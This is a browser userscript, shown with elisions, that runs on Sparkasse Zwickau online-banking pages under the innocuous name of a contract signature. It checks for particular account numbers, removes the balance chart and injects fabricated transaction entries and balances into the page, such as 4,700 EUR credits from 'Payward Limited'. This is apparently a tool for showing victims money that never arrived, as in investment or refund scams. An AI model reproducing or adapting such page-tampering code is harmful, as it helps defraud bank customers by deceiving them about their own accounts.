// ==UserScript==
// @name         Vertragssignature R Sandra Gerigk
...
// @match        https://www.spk-zwickau.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.spk-zwickau.de/fi/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.spk-zwickau.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.spk-zwickau.de/fi/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.spk-zwickau.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/473598/Vertragssignature%20R%20Sandra%20Gerigk.user.js
// @updateURL https://update.greasyfork.org/scripts/473598/Vertragssignature%20R%20Sandra%20Gerigk.meta.js
// ==/UserScript==
...
(function() {
    ...
    var x2amount = 0;
    var buchung = 20000;
    var buchungDecimal = "09";
    var buchungTextsZahl = "153.998";
    var accountsecurity = "1030 5092 19";
    ...
    if (window.location.href.indexOf("finanzuebersicht") > 0 || window.location.href.indexOf("10616040067") > 0 || window.location.href.indexOf("10479976045") > 0) {
...
localStorage.removeItem('refresh')
}, 1400); // 1700 milliseconds = 1.7 seconds
    ...
    if (window.location.href.indexOf("umsaetze") > 0 || window.location.href.indexOf("10616040426") > 0) {
...
if (saldoLinechartElement) {
    saldoLinechartElement.remove();
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
            ...
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 4.700,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Finanzamt von England für Steuern</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">4.700</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">4.700,00 EUR</span></div></div></div></div></li>';
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == "1800 0168 34"){
            ...
            var Sx2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 4.700,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Withdrawal Trading Account: AY01-503DE-SP</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">4.700</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">4.700,00 EUR</span></div></div></div></div></li>';
